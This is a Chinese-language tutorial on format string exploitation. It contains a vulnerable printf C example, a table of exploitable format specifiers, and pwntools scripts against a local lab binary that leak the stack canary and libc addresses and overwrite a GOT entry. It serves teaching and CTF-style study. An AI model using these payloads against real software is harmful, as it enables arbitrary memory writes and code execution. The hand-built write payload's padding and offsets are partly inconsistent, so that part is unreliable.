# 格式化字符串漏洞利用

格式化字符串漏洞源于`printf`系列函数使用用户可控的格式化字符串。

**漏洞代码：**

```c
#include <stdio.h>

int main(int argc, char *argv[]) {
    char buf[128];
    fgets(buf, 128, stdin);
    printf(buf);    // 危险！格式化字符串由用户控制
    return 0;
}
```

**格式化字符串利用原理：**

| 格式符 | 功能 | 利用 |
|--------|------|------|
| %p | 输出指针（栈上数据） | 信息泄露 |
| %x | 输出十六进制 | 信息泄露 |
| %s | 输出指针指向的字符串 | 任意地址读 |
| %n | 将已输出字节数写入地址 | 任意地址写 |
| %hn | 写入2字节 | 精确写2字节 |
| %hhn | 写入1字节 | 精确写1字节 |
| %{n}$p | 输出第n个参数 | 定位访问 |
| %{n}c | 输出n个字符 | 填充控制写入值 |

**确定偏移量：**

```python
from pwn import *

context.arch = 'i386'

p = process('./fmtstr')

# 发送AAAA%p%p%p%p%p%p
# 查找输出中41414141的位置
payload = b'AAAA' + b'%p.' * 20
p.sendline(payload)
result = p.recvline()
print(result)

# 假设输出: AAAA0x1.0xf7...0x41414141...
# 41414141出现在第6个参数 -> 偏移为6
```

**信息泄露：**

```python
# 泄露栈上的Canary
payload = b'%7$p'    # 第7个参数是Canary
p.sendline(payload)
canary = int(p.recvline().strip(), 16)
print(f"Canary: {hex(canary)}")

# 泄露libc地址
payload = b'%11$p'   # 泄露栈上的libc地址（__libc_start_main返回地址）
p.sendline(payload)
libc_leak = int(p.recvline().strip(), 16)
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 0xf0  # 偏移需要调整
```

**任意地址写入：**

```python
# 目标：将0x0804a024(GOT表)处写入0x08048456(system函数)
target = 0x0804a024
value = 0x08048456

# 方法：在格式化字符串中包含目标地址，用%n写入
# 偏移为6，即目标地址在第6个参数位置

# 低字节写入（分2次2字节写入）
payload = b''
# 写0x8456到target
payload += b'%' + str(0x8456).encode() + b'c'
payload += b'%8$hn'      # 第8个参数是target地址
# 写0x0804到target+2
payload += b'%' + str(0x0804 - 0x8456).encode() + b'c'
payload += b'%7$hn'      # 第7个参数是target+2地址

# 注意处理负数情况：如果0x0804 - 0x8456 < 0
# 需要加上0x10000: 0x0804 - 0x8456 + 0x10000

# 地址放在payload末尾
payload += b'AAAA'       # 对齐
payload += p32(target + 2)   # 第7个参数
payload += p32(target)       # 第8个参数

p.sendline(payload)
```

**使用pwntools的fmtstr_payload简化：**

```python
from pwn import *

context.arch = 'i386'

offset = 6  # 格式化字符串偏移

# 自动构造payload
# 向0x0804a024写入0x08048456
payload = fmtstr_payload(offset, {
    0x0804a024: 0x08048456
})
print(f"Payload长度: {len(payload)}")

p = process('./fmtstr')
p.sendline(payload)
p.interactive()
```
